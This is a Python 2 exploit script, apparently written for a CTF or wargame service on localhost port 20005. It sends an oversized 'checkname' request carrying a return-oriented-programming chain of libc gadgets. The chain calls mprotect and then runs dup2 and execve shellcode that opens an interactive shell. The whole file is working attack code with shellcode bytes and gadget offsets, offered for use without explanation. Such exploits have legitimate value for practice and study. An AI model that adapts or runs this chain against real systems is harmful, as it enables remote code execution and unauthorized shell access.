from amnesia import *
from struct import pack, unpack
import time, sys

s = amnesiaSocket("127.0.0.1", 20005)

print s.readLine()
# base libc.so.6 0xb7e5f000
base = 0xb7e5f000 
shellcode  = "\x6a\x04\x5b\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8"	# dup2 by Nox & soez
shellcode += "\x31\xc0\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" # shellcode by Nox
shellcode += "\x90" * 16

print "[+] Envio checkname.."
s.write("checkname " + "A"*44 	+ pack("<I", base + 0x798a1)  # ret ;;	
				+ pack("<I", base + 0xe426a)  # pop ebx ; pop edx ;;
				+ pack("<I", 0x42424242)      # padding
				+ pack("<I", 0xFFFFFFFF)      # -0x1
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x118e87) # inc edx ;;
				+ pack("<I", base + 0x20b0c)  # pop eax ;;
				+ pack("<I", base + 0x54)     # 0x1000 
				+ pack("<I", base + 0x3cc05)  # mov ecx [eax+0x3c] ; mov eax [eax+0x40] ;;
				+ pack("<I", base + 0x78cd4)  # pop ebx ;;
		 		+ pack("<I", 0x80021fff)      # &buffer
				+ pack("<I", base + 0x3ca7e)  # xor eax eax ;;
				+ pack("<I", base + 0x80290)  # add eax 0x1 ;;
				+ pack("<I", base + 0x80292)  # add ebx eax ; add eax 0x2 ;;
				+ pack("<I", base + 0x3ca7e)  # xor eax eax ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802c8)  # add eax 0xf ;;
				+ pack("<I", base + 0x802a0)  # add eax 0x5 ;;
				+ pack("<I", 0xB7FE2820)      # int $0x80 syscall mprotect	
				+ pack("<I", base + 0x110169) # push esp ;;
				+ "\x90"*4 + shellcode)

time.sleep(0.5)
print "[+] Interactive.."
s.interactive()
s.close()
